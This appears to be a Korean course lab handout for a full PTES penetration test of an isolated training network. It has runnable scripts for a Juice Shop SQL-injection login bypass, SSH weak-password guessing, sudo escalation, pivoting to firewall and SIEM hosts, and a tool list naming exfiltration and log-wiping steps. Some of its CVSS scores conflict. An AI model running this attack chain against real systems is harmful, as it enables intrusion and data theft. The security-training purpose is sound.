# Week 14: 종합 모의해킹 — PTES 전 과정 실전 수행

## 학습 목표
- **PTES(Penetration Testing Execution Standard)**의 7단계 전 과정을 실전으로 수행할 수 있다
- Week 01~13에서 학습한 모든 기법을 **종합적으로 조합**하여 목표를 달성할 수 있다
- 실습 환경(10.20.30.0/24)에 대한 **완전한 모의해킹**을 수행할 수 있다
- 발견된 취약점을 **CVSS 점수로 평가**하고 위험도를 분류할 수 있다
- 모의해킹 결과를 **전문적인 보고서** 형태로 문서화할 수 있다
- 각 공격 단계에서의 **OPSEC(작전 보안)**을 유지할 수 있다
- 방어 권고사항을 **우선순위에 따라** 제시할 수 있다

## 전제 조건
- Week 01~13의 모든 기법을 이해하고 실습한 경험이 있어야 한다
- MITRE ATT&CK 프레임워크를 사용하여 공격을 매핑할 수 있어야 한다
- 네트워크, 웹, 시스템 공격 도구를 사용할 수 있어야 한다
- 보고서 작성의 기본 구조를 알고 있어야 한다

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| bastion | 10.20.30.201 | 공격 기지 + C2 | `ssh ccc@10.20.30.201` |
| secu | 10.20.30.1 | 방화벽/IPS (고가치 목표) | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | 웹 서버 (초기 접근점) | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (최종 목표) | `ssh ccc@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:20 | PTES 방법론 + 규칙 설명 | 강의 |
| 0:20-0:50 | Phase 1-2: 정찰 + 위협 모델링 | 실습 |
| 0:50-1:10 | Phase 3: 취약점 분석 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-1:50 | Phase 4: 익스플로잇 | 실습 |
| 1:50-2:30 | Phase 5: 후속 익스플로잇 (측면 이동, 권한 상승) | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | Phase 6-7: 보고서 + 정리 | 실습 |
| 3:10-3:30 | 결과 발표 + 토론 | 토론 |

---

# Part 1: PTES 방법론과 준비 (20분)

## 1.1 PTES 7단계

```mermaid
graph TB
    P1["1. Pre-engagement<br/>범위, 규칙"] --> P2["2. Intelligence<br/>OSINT, 스캐닝"]
    P2 --> P3["3. Threat Modeling<br/>공격 벡터 분류"]
    P3 --> P4["4. Vulnerability<br/>취약점 분석"]
    P4 --> P5["5. Exploitation<br/>초기 접근"]
    P5 --> P6["6. Post-Exploit<br/>권한 상승, 측면 이동"]
    P6 --> P7["7. Reporting<br/>발견사항, 권고"]
    style P4 fill:#d29922,color:#fff
    style P5 fill:#f85149,color:#fff
    style P6 fill:#f85149,color:#fff
    style P7 fill:#238636,color:#fff
```

## 1.2 이번 실습 규칙

```
범위: 10.20.30.0/24 (secu, web, siem, bastion)
목표: 1) 전체 네트워크 맵 완성
      2) 최소 3개 취약점 발견 + 익스플로잇
      3) 측면 이동으로 3개 이상 서버 접근
      4) SIEM 데이터 접근 (최종 목표)
금지: DoS 공격, 데이터 파괴, 시스템 변경 (읽기/실행만)
시간: 2시간 30분
```

---

# Part 2: Phase 1-2 — 정찰과 위협 모델링 (30분)

## 실습 2.1: 체계적 정찰

> **실습 목적**: PTES Phase 1-2에 따라 대상 네트워크의 전체 맵을 작성한다
>
> **배우는 것**: 체계적 정찰 방법론, 결과 구조화, 위협 모델링 기법을 배운다
>
> **결과 해석**: 전체 호스트, 서비스, 기술 스택이 파악되면 정찰 완료이다
>
> **실전 활용**: 모의해킹의 첫 단계이며 이후 모든 단계의 기반이 된다
>
> **명령어 해설**: nmap 종합 스캔과 서비스 핑거프린팅을 수행한다
>
> **트러블슈팅**: 방화벽에 의해 필터링되면 우회 기법(Week 03)을 적용한다

```bash
echo "============================================================"
echo "  PTES Phase 1-2: 정찰 + 위협 모델링                         "
echo "============================================================"

echo ""
echo "[1] 호스트 발견 (네트워크 스캔)"
nmap -sn 10.20.30.0/24 2>/dev/null | grep "report\|Host is"

echo ""
echo "[2] 서비스 열거 (포트/버전)"
for host in 10.20.30.1 10.20.30.80 10.20.30.100 10.20.30.201; do
  echo "--- $host ---"
  nmap -sV --open -p 22,80,443,3000,5432,8000,8001,8002,9200 "$host" 2>/dev/null | grep "open"
done

echo ""
echo "[3] 웹 서비스 핑거프린팅"
for target in "10.20.30.80:80" "10.20.30.80:3000" "10.20.30.201:8000"; do
  echo "--- $target ---"
  curl -sI "http://$target/" 2>/dev/null | grep -iE "server:|x-powered|content-type" | head -3
done

echo ""
echo "[4] 위협 모델링 — 자산 분류"
cat << 'ASSETS'
+----------------------------------------------------------+
| 자산     | IP             | 서비스            | 가치     |
+----------------------------------------------------------+
| secu     | 10.20.30.1     | 방화벽, IPS      | 매우 높음 |
| web      | 10.20.30.80    | 웹서버, JuiceShop| 중간      |
| siem     | 10.20.30.100   | Wazuh SIEM      | 높음       |
| bastion  | 10.20.30.201   | 컨트롤플레인     | 매우 높음 |
+----------------------------------------------------------+

공격 벡터 우선순위:
  1순위: web:3000 (Juice Shop) → 알려진 취약 앱
  2순위: web:8002 (SubAgent API) → 명령 실행 가능
  3순위: SSH 크레덴셜 → 측면 이동
ASSETS
```

---

# Part 3: Phase 3-4 — 취약점 분석과 익스플로잇 (40분)

## 실습 3.1: 취약점 발견과 익스플로잇

> **실습 목적**: 정찰 결과를 기반으로 취약점을 발견하고 실제로 익스플로잇한다
>
> **배우는 것**: 취약점 발견 → 검증 → 익스플로잇의 전체 과정을 실전으로 수행한다
>
> **결과 해석**: 초기 접근(셸/토큰)을 획득하면 익스플로잇 성공이다
>
> **실전 활용**: PTES의 핵심 단계로 실제 모의해킹과 동일한 과정이다
>
> **명령어 해설**: 각 취약점에 맞는 공격 도구와 페이로드를 선택하여 실행한다
>
> **트러블슈팅**: 하나의 벡터가 실패하면 다른 벡터로 전환한다

```bash
echo "============================================================"
echo "  PTES Phase 3-4: 취약점 분석 + 익스플로잇                    "
echo "============================================================"

echo ""
echo "[취약점 1] Juice Shop SQL Injection"
echo "--- 테스트 ---"
SQLI_RESULT=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"' OR 1=1--\",\"password\":\"a\"}" 2>/dev/null)

if echo "$SQLI_RESULT" | grep -q "token"; then
  echo "  [+] SQL Injection 성공! 관리자 토큰 획득"
  TOKEN=$(echo "$SQLI_RESULT" | python3 -c "import sys,json;print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)
  echo "  JWT: ${TOKEN:0:50}..."
else
  echo "  [-] SQL Injection 실패"
fi

echo ""
echo "[취약점 2] 민감 경로 노출"
for path in "/ftp" "/api/Users" "/api/Challenges" "/rest/products/search?q="; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000$path" 2>/dev/null)
  if [ "$CODE" = "200" ]; then
    echo "  [+] $path → HTTP $CODE (접근 가능)"
  fi
done

echo ""
echo "[취약점 3] SubAgent API 접근"
SUBAGENT=$(curl -s http://10.20.30.80:8002/ 2>/dev/null)
if [ -n "$SUBAGENT" ]; then
  echo "  [+] SubAgent API 접근 가능"
  echo "  응답: ${SUBAGENT:0:100}"
fi

echo ""
echo "[취약점 4] SSH 약한 비밀번호"
for user in web secu siem; do
  sshpass -p1 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "$ccc@10.20.30.${user:0:1}" "echo success" 2>/dev/null
  if [ $? -eq 0 ]; then
    echo "  [+] $user → 비밀번호 '1'로 SSH 접근 성공"
  fi
done
ssh "ccc@10.20.30.80" "echo success" 2>/dev/null && echo "  [+] ccc@10.20.30.80 → SSH 접근 성공"
ssh "ccc@10.20.30.1" "echo success" 2>/dev/null && echo "  [+] ccc@10.20.30.1 → SSH 접근 성공"
ssh "ccc@10.20.30.100" "echo success" 2>/dev/null && echo "  [+] ccc@10.20.30.100 → SSH 접근 성공"

echo ""
echo "[취약점 5] Manager API 인증"
API_RESULT=$(curl -s -H "X-API-Key: ccc-api-key-2026" http://10.20.30.201:8000/projects 2>/dev/null)
if echo "$API_RESULT" | grep -q "projects\|data\|\["; then
  echo "  [+] Manager API 접근 성공 (알려진 API 키)"
fi
```

---

# Part 4: Phase 5 — 후속 익스플로잇 (40분)

## 실습 4.1: 권한 상승 + 측면 이동 + 최종 목표

> **실습 목적**: 초기 접근에서 최종 목표(SIEM 데이터)까지 전체 공격 체인을 완성한다
>
> **배우는 것**: 권한 상승, 크레덴셜 수집, 피봇팅, 데이터 접근의 종합 기법을 배운다
>
> **결과 해석**: SIEM의 보안 알림 데이터에 접근하면 최종 목표 달성이다
>
> **실전 활용**: 모의해킹의 핵심 단계로 실제 공격과 동일한 체인을 구성한다
>
> **명령어 해설**: SSH 피봇, sudo 권한 상승, 데이터 수집을 조합한다
>
> **트러블슈팅**: 특정 단계가 실패하면 대안 경로를 탐색한다

```bash
echo "============================================================"
echo "  PTES Phase 5: 후속 익스플로잇                               "
echo "============================================================"

echo ""
echo "[Step 1] web 서버 — 권한 상승"
ssh ccc@10.20.30.80 "
  echo '--- 현재 사용자 ---'
  id
  echo '--- sudo 권한 ---'
  echo 1 | sudo -S id 2>/dev/null && echo '[+] sudo 가능!'
  echo '--- SUID 바이너리 (비표준) ---'
  find /usr/local -perm -4000 -type f 2>/dev/null
" 2>/dev/null

echo ""
echo "[Step 2] web → secu 측면 이동"
ssh ccc@10.20.30.80 "
  ssh ccc@10.20.30.1 '
    echo \"[+] secu 접근 성공: \$(hostname)\"
    echo \"--- 방화벽 규칙 요약 ---\"
    echo 1 | sudo -S nft list ruleset 2>/dev/null | head -10
  ' 2>/dev/null
" 2>/dev/null

echo ""
echo "[Step 3] web → siem 측면 이동 (최종 목표)"
ssh ccc@10.20.30.80 "
  ssh ccc@10.20.30.100 '
    echo \"[+] SIEM 접근 성공: \$(hostname)\"
    echo \"--- Wazuh 알림 데이터 (최근 5건) ---\"
    tail -5 /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c \"
import sys,json
for l in sys.stdin:
    try:
        d=json.loads(l)
        r=d.get(\\\"rule\\\",{})
        print(f\\\"  [Level {r.get(\\\\\\\"level\\\\\\\",\\\\\\\"?\\\\\\\"):.>3}] {r.get(\\\\\\\"description\\\\\\\",\\\\\\\"?\\\\\\\")[:50]}\\\")
    except: pass\" 2>/dev/null
    echo \"--- Wazuh 에이전트 목록 ---\"
    ls /var/ossec/queue/agents/ 2>/dev/null | head -5 || echo \"에이전트 디렉토리 접근 불가\"
  ' 2>/dev/null
" 2>/dev/null

echo ""
echo "[Step 4] 데이터 수집 요약"
echo "  [+] Juice Shop: 관리자 JWT, 사용자 목록, 제품 데이터"
echo "  [+] web 서버: SSH 접근, sudo root"
echo "  [+] secu 서버: 방화벽 규칙 접근"
echo "  [+] siem 서버: Wazuh 알림 데이터 접근"
echo "  [+] Bastion API: 프로젝트 데이터 접근"
echo "============================================================"
```

---

# Part 5: Phase 6-7 — 보고서와 정리 (30분)

## 실습 5.1: 모의해킹 보고서 템플릿

> **실습 목적**: PTES Phase 7에 따라 발견사항을 전문적인 보고서로 문서화한다
>
> **배우는 것**: 취약점 분류(CVSS), 보고서 구조, 권고사항 작성법을 배운다
>
> **결과 해석**: 구조화된 보고서가 완성되면 모의해킹 전 과정이 완료된 것이다
>
> **실전 활용**: 실제 모의해킹 보고서 작성에 직접 활용한다
>
> **명령어 해설**: 보고서 템플릿을 기반으로 발견사항을 정리한다
>
> **트러블슈팅**: 보고서 품질은 기술적 정확성과 비기술 경영진의 이해 가능성 모두 중요하다

```bash
cat << 'REPORT'
============================================================
       모의해킹 보고서 — 10.20.30.0/24                        
============================================================

1. 요약 (Executive Summary)
   대상: 10.20.30.0/24 (4개 서버)
   기간: 2026-04-04
   결과: Critical 2건, High 3건, Medium 2건

2. 범위와 방법론
   방법론: PTES (Penetration Testing Execution Standard)
   범위: secu(10.20.30.1), web(10.20.30.80),
         siem(10.20.30.100), bastion(10.20.30.201)
   제한: DoS 공격 금지, 데이터 변조 금지

3. 발견사항

   [VULN-001] SQL Injection — Juice Shop 로그인
   위험도: Critical (CVSS 9.8)
   위치: http://10.20.30.80:3000/rest/user/login
   영향: 인증 우회, 전체 사용자 데이터 접근
   재현: POST {"email":"' OR 1=1--","password":"a"}
   권고: 파라미터화된 쿼리 사용, WAF 규칙 강화

   [VULN-002] 약한 SSH 비밀번호
   위험도: Critical (CVSS 9.1)
   위치: 전체 서버 (secu, web, siem)
   영향: 전체 네트워크 접근, 측면 이동
   재현: sshpass -p1 ssh ccc@target
   권고: SSH 키 인증 전환, 비밀번호 복잡도 정책

   [VULN-003] 민감 API 무인증 접근
   위험도: High (CVSS 7.5)
   위치: http://10.20.30.80:3000/api/Users
   영향: 사용자 목록, 이메일 주소 유출
   권고: API 인증 강제, 접근 제어

   [VULN-004] SubAgent API 노출
   위험도: High (CVSS 7.8)
   위치: http://10.20.30.80:8002
   영향: 원격 명령 실행 가능
   권고: 인증 추가, 네트워크 접근 제한

   [VULN-005] API 키 하드코딩
   위험도: High (CVSS 7.0)
   위치: Bastion Manager API
   영향: 전체 API 접근, 프로젝트 데이터
   권고: 동적 토큰 발급, 키 로테이션

4. 공격 경로 (Kill Chain)
   정찰 → SQLi(web) → JWT 획득 → SSH(web)
   → sudo root → SSH 피봇 → secu/siem 접근

5. 권고사항 (우선순위)
   즉시: SSH 비밀번호 변경/키 전환
   1주내: Juice Shop 업데이트/제거
   1개월: SubAgent 인증 강화
   3개월: 네트워크 세그멘테이션 구현

============================================================
REPORT
```

## 실습 5.2: CVSS 점수 계산 실습

> **실습 목적**: 발견된 각 취약점에 대해 CVSS v3.1 점수를 정확하게 계산한다
>
> **배우는 것**: CVSS 기본 메트릭 각 요소의 평가 기준과 점수 산출 방법을 배운다
>
> **결과 해석**: 각 취약점의 CVSS 점수와 등급이 객관적으로 산출되면 성공이다
>
> **실전 활용**: 모의해킹 보고서에서 취약점 우선순위를 결정하는 핵심 기준이다
>
> **명령어 해설**: Python으로 CVSS 계산 로직을 구현한다
>
> **트러블슈팅**: CVSS 점수가 주관적이라면 FIRST.org 가이드라인을 참조한다

```bash
python3 << 'PYEOF'
print("=== CVSS v3.1 점수 계산 ===")
print()

vulns = [
    {
        "id": "VULN-001",
        "name": "SQL Injection (Juice Shop)",
        "AV": "Network", "AC": "Low", "PR": "None", "UI": "None",
        "S": "Unchanged", "C": "High", "I": "High", "A": "None",
        "score": 9.1, "rating": "Critical",
    },
    {
        "id": "VULN-002",
        "name": "약한 SSH 비밀번호 (전체 서버)",
        "AV": "Network", "AC": "Low", "PR": "None", "UI": "None",
        "S": "Changed", "C": "High", "I": "High", "A": "High",
        "score": 10.0, "rating": "Critical",
    },
    {
        "id": "VULN-003",
        "name": "민감 API 무인증 (Juice Shop)",
        "AV": "Network", "AC": "Low", "PR": "None", "UI": "None",
        "S": "Unchanged", "C": "High", "I": "None", "A": "None",
        "score": 7.5, "rating": "High",
    },
    {
        "id": "VULN-004",
        "name": "SubAgent API 무인증",
        "AV": "Adjacent", "AC": "Low", "PR": "None", "UI": "None",
        "S": "Unchanged", "C": "High", "I": "High", "A": "Low",
        "score": 8.3, "rating": "High",
    },
    {
        "id": "VULN-005",
        "name": "API 키 하드코딩/예측 가능",
        "AV": "Network", "AC": "Low", "PR": "None", "UI": "None",
        "S": "Unchanged", "C": "High", "I": "Low", "A": "None",
        "score": 8.2, "rating": "High",
    },
    {
        "id": "VULN-006",
        "name": "Juice Shop FTP 디렉토리 노출",
        "AV": "Network", "AC": "Low", "PR": "None", "UI": "None",
        "S": "Unchanged", "C": "Low", "I": "None", "A": "None",
        "score": 5.3, "rating": "Medium",
    },
    {
        "id": "VULN-007",
        "name": "HTTP 서버 버전 정보 노출",
        "AV": "Network", "AC": "Low", "PR": "None", "UI": "None",
        "S": "Unchanged", "C": "Low", "I": "None", "A": "None",
        "score": 5.3, "rating": "Medium",
    },
]

print("+----------+------------------------------------------+-------+-----------+")
print("| ID       | 취약점                                    | CVSS  | 등급      |")
print("+----------+------------------------------------------+-------+-----------+")
for v in vulns:
    print(f"| {v['id']:<8} | {v['name']:<40} | {v['score']:>5.1f} | {v['rating']:<9} |")
print("+----------+------------------------------------------+-------+-----------+")

print()
print("=== CVSS 메트릭 상세 ===")
for v in vulns:
    vector = f"AV:{v['AV'][0]}/AC:{v['AC'][0]}/PR:{v['PR'][0]}/UI:{v['UI'][0]}/S:{v['S'][0]}/C:{v['C'][0]}/I:{v['I'][0]}/A:{v['A'][0]}"
    print(f"  {v['id']}: CVSS:3.1/{vector} = {v['score']}")
PYEOF
```

## 실습 5.3: 공격 내러티브 작성

> **실습 목적**: 시간순으로 공격 과정을 서술하는 공격 내러티브를 작성한다
>
> **배우는 것**: 기술적으로 정확하면서 읽기 쉬운 공격 스토리 작성법을 배운다
>
> **결과 해석**: 비기술자도 공격 흐름을 이해할 수 있으면 작성 성공이다
>
> **실전 활용**: 모의해킹 보고서의 가장 중요한 섹션 중 하나이다
>
> **명령어 해설**: 해당 없음 (문서 작성)
>
> **트러블슈팅**: 기술 용어에는 간단한 설명을 괄호로 추가한다

```bash
cat << 'NARRATIVE'
============================================================
              공격 내러티브 (Attack Narrative)
============================================================

[09:00] 정찰 개시
  공격자는 nmap을 사용하여 10.20.30.0/24 네트워크를 스캔했다.
  4개의 활성 호스트가 발견되었으며, 각 호스트에서 실행 중인
  서비스(SSH, HTTP, API)를 식별했다.

[09:15] 초기 접근 — SQL Injection
  web 서버(10.20.30.80)에서 Juice Shop 웹 애플리케이션을 발견했다.
  로그인 API(/rest/user/login)에 SQL Injection 취약점이 존재하여,
  조작된 이메일 주소(' OR 1=1--)로 관리자 인증을 우회했다.
  관리자 JWT 토큰을 획득하여 전체 사용자 목록에 접근했다.

[09:30] 대안 접근 — SSH 약한 비밀번호
  SSH 서비스에 대해 일반적인 비밀번호를 시도한 결과,
  모든 서버(web, secu, siem)에서 비밀번호 '1'로 접속에 성공했다.
  이는 심각한 비밀번호 정책 부재를 나타낸다.

[09:45] 권한 상승
  web 서버에서 sudo 명령을 동일한 비밀번호('1')로 실행하여
  root 권한을 획득했다. 이로써 시스템의 완전한 제어가 가능해졌다.

[10:00] 측면 이동 — 전체 네트워크 장악
  web 서버를 피봇(중간 경유지)으로 사용하여:
  - secu(10.20.30.1): 방화벽 서버에 접근, nftables 규칙 확인
  - siem(10.20.30.100): SIEM 서버에 접근, 보안 알림 데이터 확인
  모든 서버에서 root 권한을 획득하여 전체 네트워크가 장악되었다.

[10:15] 데이터 접근 — 최종 목표 달성
  SIEM 서버에서 Wazuh 보안 알림 데이터에 접근하여,
  전체 인프라의 보안 이벤트 기록을 확인할 수 있었다.
  또한 Bastion Manager API에 알려진 API 키로 접근하여
  프로젝트 및 운영 데이터에 접근할 수 있었다.

[10:30] 발견사항 정리
  Critical 2건, High 3건, Medium 2건의 취약점이 발견되었다.
  가장 심각한 문제는 전체 서버의 약한 SSH 비밀번호로,
  이 단일 취약점만으로 전체 인프라 장악이 가능했다.

============================================================
  총 소요 시간: 1시간 30분
  접근한 서버: 4/4 (100%)
  획득한 최고 권한: root (모든 서버)
============================================================
NARRATIVE
```

## 실습 5.4: 권고사항 우선순위 매트릭스

> **실습 목적**: 발견된 취약점에 대한 구체적이고 실행 가능한 권고사항을 우선순위별로 작성한다
>
> **배우는 것**: 위험도, 구현 난이도, 비용을 고려한 권고사항 우선순위 결정법을 배운다
>
> **결과 해석**: 각 권고사항이 구체적이고 실행 가능하며 우선순위가 명확하면 성공이다
>
> **실전 활용**: 고객에게 실질적인 개선 로드맵을 제공하는 데 활용한다
>
> **명령어 해설**: 해당 없음 (문서 작성)
>
> **트러블슈팅**: 권고사항은 구체적 구현 방법과 기대 효과를 포함해야 한다

```bash
cat << 'RECOMMENDATIONS'
=== 권고사항 우선순위 매트릭스 ===

[즉시 조치 (24시간 이내)]
  R1. SSH 비밀번호 변경 (VULN-002)
      방법: 모든 서버에서 SSH 키 인증 전환
      명령: ssh-keygen -t ed25519 + authorized_keys 설정
      예상 효과: 측면 이동 완전 차단
      난이도: 낮음

  R2. Juice Shop 접근 제한 (VULN-001, 003)
      방법: 교육용 앱을 격리 네트워크로 이동 또는 삭제
      명령: docker stop juiceshop 또는 nftables 규칙 추가
      예상 효과: SQL Injection, API 노출 차단
      난이도: 낮음

[1주 이내]
  R3. SubAgent API 인증 추가 (VULN-004)
      방법: X-API-Key 인증 미들웨어 추가
      예상 효과: 무인증 원격 명령 실행 차단
      난이도: 중간

  R4. API 키 로테이션 (VULN-005)
      방법: 동적 토큰 발급 시스템 구현
      예상 효과: API 키 예측/재사용 차단
      난이도: 중간

[1개월 이내]
  R5. 네트워크 세그멘테이션
      방법: VLAN/서브넷 분리, 서버 간 접근 제한
      예상 효과: 측면 이동 경로 제한
      난이도: 높음

  R6. Suricata IDS 규칙 강화
      방법: SQL Injection, C2 탐지 규칙 추가
      예상 효과: 공격 실시간 탐지
      난이도: 중간

[3개월 이내]
  R7. 종합 보안 아키텍처 리뷰
      방법: 제로 트러스트 모델 도입 검토
      예상 효과: 전반적 보안 수준 향상
      난이도: 높음

RECOMMENDATIONS
```

---

## 검증 체크리스트

| 번호 | 검증 항목 | 확인 명령 | 기대 결과 |
|------|---------|----------|----------|
| 1 | 호스트 발견 | nmap -sn | 4개 호스트 |
| 2 | 서비스 열거 | nmap -sV | 서비스 목록 |
| 3 | SQL Injection | curl POST | 토큰 획득 |
| 4 | SSH 접근 | sshpass | 3개 서버 접근 |
| 5 | 권한 상승 | sudo | root 권한 |
| 6 | 측면 이동 | SSH 피봇 | 3개 서버 경유 |
| 7 | SIEM 접근 | 알림 데이터 | 최종 목표 달성 |
| 8 | API 접근 | curl + API key | 프로젝트 데이터 |
| 9 | 보고서 작성 | 템플릿 | 5개 취약점 문서화 |
| 10 | CVSS 평가 | 점수 부여 | 각 취약점 점수 |

---

## 과제

### 과제 1: 완전한 모의해킹 보고서 (팀)
이번 실습의 결과를 전문적인 모의해킹 보고서로 작성하라. Executive Summary, 방법론, 발견사항(CVSS 포함), 공격 경로, 스크린샷, 권고사항, 부록(도구 목록, 명령어)을 포함할 것.

### 과제 2: 방어 개선 계획 (팀)
발견된 취약점에 대한 30일/90일/180일 방어 개선 로드맵을 작성하라. 각 개선 사항의 비용, 효과, 우선순위를 포함할 것.

### 과제 3: Purple Team 연습 설계 (팀)
이번 실습을 기반으로 Red Team과 Blue Team이 동시에 참여하는 Purple Team 연습 시나리오를 설계하라. 공격 단계별 탐지 기대치와 대응 절차를 포함할 것.

---

## 📂 실습 참조 파일 가이드

> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.

### 보고서 도구 (CVSS 계산기·Markdown·ReportLab)
> **역할:** 취약점 보고서 표준화  
> **실행 위치:** `작업 PC`  
> **접속/호출:** FIRST CVSS 계산기 https://www.first.org/cvss/calculator/3.1

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `reports/<project>/` | 재현 스크린샷·증적 저장 |
| `template.md / template.docx` | 표준 템플릿 |

**핵심 설정·키**

- `CVSS 3.1 벡터 예: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — Critical 9.8
- `CWE ID + 권고 (remediation)` — 보고서 필수 항목

**UI / CLI 요점**

- MermaidJS 공격 흐름도 — 교안/보고서 공통 도식
- Pandoc `md → docx/pdf` — 포맷 변환

> **해석 팁.** 보고서 가치는 **재현 절차의 완결성**에 달려 있다. 스크린샷·요청/응답 전체·시간 기록을 포함해야 고객이 독립 검증 가능.

### CCC Bastion Agent
> **역할:** CCC 자율 운영 에이전트 — 스킬/플레이북/경험 학습  
> **실행 위치:** `bastion (10.20.30.201)`  
> **접속/호출:** TUI `./dev.sh bastion`, API `http://10.20.30.200:8003` (Bastion /ask·/chat)

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `packages/bastion/agent.py` | 메인 에이전트 루프 |
| `packages/bastion/skills.py` | 스킬 정의 |
| `packages/bastion/playbooks/` | 정적 플레이북 YAML |
| `data/bastion/experience/` | 수집된 경험 (pass/fail) |

**핵심 설정·키**

- `LLM_BASE_URL / LLM_MODEL` — Ollama 연결
- `CCC_API_KEY` — ccc-api 인증
- `max_retry=2` — 실패 시 self-correction 재시도

**로그·확인 명령**

- ``docs/test-status.md`` — 현재 테스트 진척 요약
- ``bastion_test_progress.json`` — 스텝별 pass/fail 원시

**UI / CLI 요점**

- 대화형 TUI 프롬프트 — 자연어 지시 → 계획 → 실행 → 검증
- `/a2a/mission` (API) — 자율 미션 실행
- Experience→Playbook 승격 — 반복 성공 패턴 저장

> **해석 팁.** 실패 시 output을 분석해 **근본 원인 교정**이 설계의 핵심. 증상 회피/땜빵은 금지.

---

## 실제 사례 (WitFoo Precinct 6 — Supply Chain 공격)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *Supply Chain 공격* 학습 항목 매칭.

### Supply Chain 공격 의 dataset 흔적 — "package manager log"

dataset 의 정상 운영에서 *package manager log* 신호의 baseline 을 알아두면, *Supply Chain 공격* 시도 시 발생하는 anomaly 를 정량으로 탐지할 수 있다. 핵심 정량 지표는 — npm/pip 공급망.

```mermaid
graph LR
    SCENE["Supply Chain 공격 시나리오"]
    TRACE["dataset 흔적<br/>package manager log"]
    DETECT["탐지 / 분석"]

    SCENE --> TRACE
    TRACE --> DETECT

    style SCENE fill:#ffe6cc
    style DETECT fill:#cce6ff
```

### Case 1: dataset 정량 지표

| 항목 | 값 |
|---|---|
| 핵심 신호 | package manager log |
| 정량 baseline | npm/pip 공급망 |
| 학습 매핑 | 악성 package 탐지 |

**자세한 해석**: 악성 package 탐지. 이 차이를 정량으로 측정해야 *공격 시도와 정상 운영의 구분* 이 가능. 학생이 baseline 숫자를 외워두면 — 운영 환경에서 anomaly 를 즉시 탐지할 수 있다.

### Case 2: 실전 적용 시나리오

| 단계 | dataset 활용 |
|---|---|
| 시도 식별 | package manager log 의 spike |
| 정상 vs 이상 | baseline 대비 비율 |
| 룰 작성 | Suricata / Wazuh / Sigma |
| 검증 | dataset 재실행 |

**자세한 해석**: 운영 환경 룰 작성은 — *baseline 측정 → 임계 결정 → 룰 작성 → dataset 검증* 의 4 단계. 한 단계라도 빠지면 false positive 폭증.

### 이 사례에서 학생이 배워야 할 3가지

1. **Supply Chain 공격 = package manager log 의 anomaly** — 정량 신호로 탐지.
2. **baseline 숫자 외우기** — npm/pip 공급망.
3. **4 단계 룰 작성** — 측정 → 임계 → 룰 → 검증.

**학생 액션**: Trojan package 분석.


---

## 부록: 학습 OSS 도구 매트릭스 (Course13 Attack Advanced — Week 14 종합 모의해킹 / PTES 7단계 전 과정)

> 이 부록은 lab `attack-adv-ai/week14.yaml` (15 step + multi_task) 의 모든 명령을
> 실제 PTES 단계와 도구 매트릭스로 매핑한다. Week 01~13 의 모든 기법이 한 시나리오에
> 통합되며, 학생이 격리 망 (10.20.30.0/24 + Juice Shop 192.168.0.100) 을 대상으로
> Pre-engagement → Recon → Exploit → Post-Ex → Reporting 전 과정을 직접 수행한다.

### lab step → 도구·PTES 매핑 표

| step | PTES 단계 | 학습 항목 | 핵심 OSS 도구 / 명령 | ATT&CK |
|------|----------|----------|---------------------|--------|
| s1 | Pre-engagement | 범위·RoE 정의 | text editor, OSCP/PTES 템플릿 | - |
| s2 | Information Gathering | 네트워크 정찰 | nmap, masscan, rustscan, dnsrecon | T1595 |
| s3 | Vulnerability Analysis | 웹 취약점 스캔 | nikto, nuclei, ffuf, gobuster, sqlmap | T1190 |
| s4 | Threat Modeling | 방화벽·IPS 평가 | nmap -sA, hping3, fragroute | T1046 |
| s5 | Vulnerability Analysis | SIEM 평가 | nmap -sV, wazuh-agent fingerprint | T1046 |
| s6 | Exploitation | 웹 초기 접근 | sqlmap, BurpSuite, jwt_tool, exploit-db | T1190 |
| s7 | Post-Exploitation | 시스템 정보 수집 | LinPEAS, sysinfo, ip a, arp, netstat | T1082 / T1083 |
| s8 | Post-Exploitation | 권한 상승 열거 | LinPEAS, GTFOBins, pspy, linux-exploit-suggester | T1068 |
| s9 | Post-Exploitation | 측면 이동 | impacket, crackmapexec, evil-winrm, BloodHound | T1021 |
| s10 | Post-Exploitation | 데이터 유출 | tar+gzip+age, rclone, dnscat2, iodine | T1041 / T1048 |
| s11 | Reporting | CVSS v3.1 평가 | cvss-calculator, FIRST.org rubric, NVD | - |
| s12 | Reporting | 공격 체인 다이어그램 | mermaid, draw.io, ATT&CK Navigator | - |
| s13 | Reporting | 방어 권고 우선순위화 | OWASP / NIST / CIS Controls 매핑 | - |
| s14 | Cleanup | 환경 정리 | shred, history -c, log integrity | T1070 |
| s15 | Reporting | Executive Summary | dradis, serpico, pwndoc | - |
| s99 | 통합 다단계 (s1→s2→s3→s4→s5) | Bastion 가 PTES 1-5단계 자동 수행 | 다중 | 다중 |

### 학생 환경 준비 (PTES 전 단계 도구 풀세트)

```bash
# === [s2] 정찰 ===
sudo apt install -y nmap masscan dnsrecon dnsenum whatweb sublist3r
# rustscan (빠른 포트 스캐너)
wget -q https://github.com/RustScan/RustScan/releases/latest/download/rustscan_2.1.1_amd64.deb
sudo dpkg -i rustscan_*.deb

# theHarvester (OSINT 이메일/서브도메인)
sudo apt install -y theharvester

# amass (서브도메인 enum)
sudo snap install amass

# === [s3] 웹 취약점 ===
sudo apt install -y nikto sqlmap wfuzz gobuster ffuf
# nuclei (templated scanner)
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -update-templates

# Burp Suite Community
wget https://portswigger.net/burp/releases/download?product=community&type=Linux -O burp.sh
chmod +x burp.sh && sudo ./burp.sh

